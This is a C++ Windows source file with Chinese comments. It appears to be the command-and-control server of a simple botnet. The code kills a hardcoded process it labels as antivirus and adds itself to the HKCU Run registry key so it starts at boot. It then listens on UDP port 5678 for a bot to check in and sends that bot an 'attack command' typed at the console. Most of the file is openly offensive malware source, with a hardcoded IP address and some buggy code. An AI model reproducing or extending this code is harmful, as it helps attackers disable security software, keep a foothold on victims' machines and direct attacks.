#pragma comment(lib, "Ws2_32.lib")
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // 設置入口位址 
#include <WinSock2.h>
#include <iostream>
#include <string>
# include <tchar.h>
#include <windows.h>
//aa
using namespace std;


struct NetInfo {
	int Port;
	char *IP;
};
#define struct NetInfo NetInfo;  
#define Default_Port 5678;
#define buffer_size 1024;
void Check_Registry(char *Path);
int Windows_Sockets_Version();
int SetServerSocket(SOCKET *SockServer,NetInfo *netinfo);
int ReceivefromClient(SOCKET SockServer, sockaddr_in *clientAddr );
int SendtoClient(SOCKET SockServer, sockaddr_in clientAddr,char *Attack_Command);
int size(char *Attack_Command);
BOOL KillProcess(DWORD ProcessId);
int main(int argc,char* argv[])
{	 
	NetInfo netinfo[1]={NULL};
	SOCKET SockServer=NULL;
	sockaddr_in clientAddr={0};  
	//判斷WindSocketServer();owsSocket使用版本
	KillProcess(4872);
	cout<<"關閉防毒軟體"<<endl;
	//註冊開機自動執行
	Check_Registry(argv[0]);
	if(Windows_Sockets_Version()!=0){
		cout<<"Failed to load Winsock!"<<endl;
		getchar();
		return -1;
	}
	//cout<<"Successful!"<<endl;		
	netinfo[0].IP="203.64.84.139";
	netinfo[0].Port=5678;
	//創建Socket通道
	if(SetServerSocket(&SockServer,netinfo)==-1)
		return -1;
	//等待接收
	if(ReceivefromClient(SockServer,&clientAddr)==-1)
		return -1;

	char message[1024]={'\0'};
	cout<<"攻擊命令輸入:";	
	cin.getline(message,1024);
	//送出攻擊訊息
	if(SendtoClient(SockServer,clientAddr,message)==-1)
		return -1;

	getchar();
	return 0;
}
BOOL KillProcess(DWORD ProcessId)
{
	HANDLE hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
	if(hProcess==NULL)
		return FALSE;
	if(!TerminateProcess(hProcess,0))
		return FALSE;
	return TRUE;
}
void Check_Registry(char *Path){
	HKEY hKey = NULL;
	TCHAR * subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	DWORD dwOptions = REG_OPTION_NON_VOLATILE;
	DWORD dwDisposition;
	//LONG RegCreateKeyEx(  
	//           HKEY hKey,        // 主見名稱
	//           LPCTSTR lpSubKey,     // 子見名稱或路徑
	//           DWORD Reserved,      // 保留，為0  
	//           LPTSTR lpClass,      // 一般設置為NULL
	//           DWORD dwOptions,       
	//           對你一些見的選項，可以是這些值：REG_OPTION_NON_VOLATILE，
	//			REG_OPTION_VOLATILE，
	//			REG_OPTION_BACKUP_RESTORE 第一個是默認的。一般用第一個就行了
	//           REGSAM samDesired,    // 設置你建立的這個見的權限
	//           LPSECURITY_ATTRIBUTES lpSecurityAttributes,  
	//           //一般設置為NULL
	//           PHKEY phkResult,     // 返回新建註冊表項  
	//           LPDWORD lpdwDisposition  //用察看是打開一個現有的建，還是新建的建  
	//     );  
	long resulte = RegCreateKeyEx(HKEY_CURRENT_USER, subKey, 0, NULL, 
		dwOptions, KEY_WRITE|KEY_READ, NULL, &hKey, &dwDisposition);
	if (resulte != ERROR_SUCCESS)
		cout<<"打開註冊表失敗"<<endl;
	else
	{
		if (dwDisposition == REG_OPENED_EXISTING_KEY)
		{
			cout<<"打開一個存在的註冊表"<<endl;
			if(RegQueryValueEx(hKey, TEXT("Guo Jun Su"), NULL, NULL, NULL, NULL) == ERROR_FILE_NOT_FOUND){
				cout << "Writing to registry...\n";

				RegSetValueEx(hKey, _T("Guo Jun Su"), 0, REG_SZ, (LPBYTE) Path, (DWORD)strlen(Path)*sizeof(CHAR)) ;
			}
		}
		else if (dwDisposition == REG_CREATED_NEW_KEY) 
			cout<<"新增一個註冊表項"<<endl;
	}
}

int Windows_Sockets_Version(){
	int Result;
	WSAData wsaData;
	WORD DLLVSERION;
	DLLVSERION = MAKEWORD(2,2);//Winsocket-DLL 版本
	//用 WSAStartup 開始 Winsocket-DLL
	Result = WSAStartup(DLLVSERION, &wsaData);
	return Result;
}

int SetServerSocket(SOCKET *SockServer,NetInfo *netinfo){
	struct sockaddr_in thisAddr;
	int timeout=10000;
	//設定Client網路環境
	memset(&thisAddr,0,sizeof(thisAddr));
	thisAddr.sin_family = AF_INET;  
	thisAddr.sin_port = htons(netinfo[0].Port);  
	//thisAddr.sin_addr.s_addr =  inet_addr(netinfo[0].IP); 
	thisAddr.sin_addr.s_addr = INADDR_ANY; // 若設定 INADDR_ANY 表示任何 IP

	//建立與Server溝通的socket和與Client溝通的socket，注意必須是在一樣的Port。  
	*SockServer = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);  
	if (*SockServer == INVALID_SOCKET) {  
		cout<<"Socket() failed:"<<WSAGetLastError()<<endl;  
		return -1;  
	}
	cout<<"Socket Success~"<<endl;
	if (bind(*SockServer,(SOCKADDR*)&thisAddr,sizeof(thisAddr)) == SOCKET_ERROR) {  
		cout<<"Bind() failed:"<<WSAGetLastError()<<endl;  
		return -1;  
	}  
	cout<<"Bind Success~"<<endl;
	//設定timeout 
	setsockopt(*SockServer,SOL_SOCKET,SO_RCVTIMEO,(char *)&timeout,sizeof(timeout));
	setsockopt(*SockServer,SOL_SOCKET,SO_SNDTIMEO,(char *)&timeout,sizeof(timeout));
}

int ReceivefromClient(SOCKET SockServer, sockaddr_in *clientAddr){
	int Buffer_Size=buffer_size;
	//Server 
	while(1){
		//Client1從Server返回的資訊中得到Client2的Ip和Port  	
		char bufRecv[1024]={0};  
		int length=sizeof((*clientAddr));
		//if(round==5){
		//	round=0;
		//	closesocket(SockServer);  
		//	WSACleanup();
		//	//建立與Server溝通的socket和與Client溝通的socket，注意必須是在一樣的Port。  
		//	SOCKET SockServer = socket(AF_INET,SOCK_DGRAM,0);  
		//	if (SockServer == INVALID_SOCKET) {  
		//		cout<<"Socket() failed:"<<WSAGetLastError()<<endl;  
		//		return -1;  
		//	}
		//	cout<<"Socket Success~"<<endl;
		//	cout<<"test"<<endl;
		//}
		//設定timeout 避免收步道封包卡住
		if (recvfrom(SockServer, bufRecv, sizeof(bufRecv), 0,(SOCKADDR*)&(*clientAddr),&length) == SOCKET_ERROR) {  
			cout<<"Recvfrom() failed:"<<WSAGetLastError()<<endl;  
			continue;
		}  
		cout<<"Recvfrom Success~"<<endl;
		cout<<"Source IP:"<<inet_ntoa((*clientAddr).sin_addr)<<"\t, Port:"<<htons((*clientAddr).sin_port)<<"，Send:"<<bufRecv<<endl;	
		break;
	}
	return 0;
}

int SendtoClient(SOCKET SockServer, sockaddr_in clientAddr,char *Attack_Command){
	//Server Send Message To Client 
	int wordsize=size(Attack_Command);
	if (sendto(SockServer,Attack_Command,wordsize,0,(SOCKADDR*)&clientAddr,sizeof(clientAddr)) == SOCKET_ERROR) {  
		cout<<"Sendto() failed:"<<WSAGetLastError()<<endl;  
		return -1; 
	}  
	cout<<"送出去的訊息:"<<Attack_Command<<endl;	
	return 0;
}

int size(char *Attack_Command){
	int wordsize=0;
	for(;Attack_Command[wordsize]!='\0';wordsize++);
	return wordsize;
}